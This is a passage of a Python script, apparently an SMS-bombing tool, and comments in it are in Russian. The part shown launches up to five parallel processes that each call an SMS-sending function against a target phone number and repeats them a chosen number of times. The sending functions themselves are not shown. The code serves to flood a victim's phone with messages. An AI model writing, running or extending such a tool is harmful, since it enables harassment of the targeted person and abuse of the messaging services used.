                p2.start()
                p3.start()

                p1.join()
                p2.join()
                p3.join()

    if ff==4:
        raz=int(raz)
        for i in range(raz):

                p1 = multiprocessing.Process(target=Sms_multi_1, args=(number,))
                p2 = multiprocessing.Process(target=Sms_multi_2, args=(number,))
                p3 = multiprocessing.Process(target=Sms_multi_3, args=(number,))
                p4 = multiprocessing.Process(target=Sms_multi_4, args=(number,))

                p1.start()
                p2.start()
                p3.start()
                p4.start()

                p1.join()
                p2.join()
                p3.join()
                p4.join()

    if ff==5:
        raz=int(raz)
        for i in range(raz):

                p1 = multiprocessing.Process(target=Sms_multi_1, args=(number,))
                p2 = multiprocessing.Process(target=Sms_multi_2, args=(number,))
                p3 = multiprocessing.Process(target=Sms_multi_3, args=(number,))
                p4 = multiprocessing.Process(target=Sms_multi_4, args=(number,))
                p5 = multiprocessing.Process(target=Sms_multi_5, args=(number,))

                p1.start()
                p2.start()
                p3.start()
                p4.start()
                p5.start()

                p1.join()
                p2.join()
                p3.join()
                p4.join()
                p5.join()

    if ff<1 or ff>5:
        print('Нужно ввести от одно до пяти, давай по новой')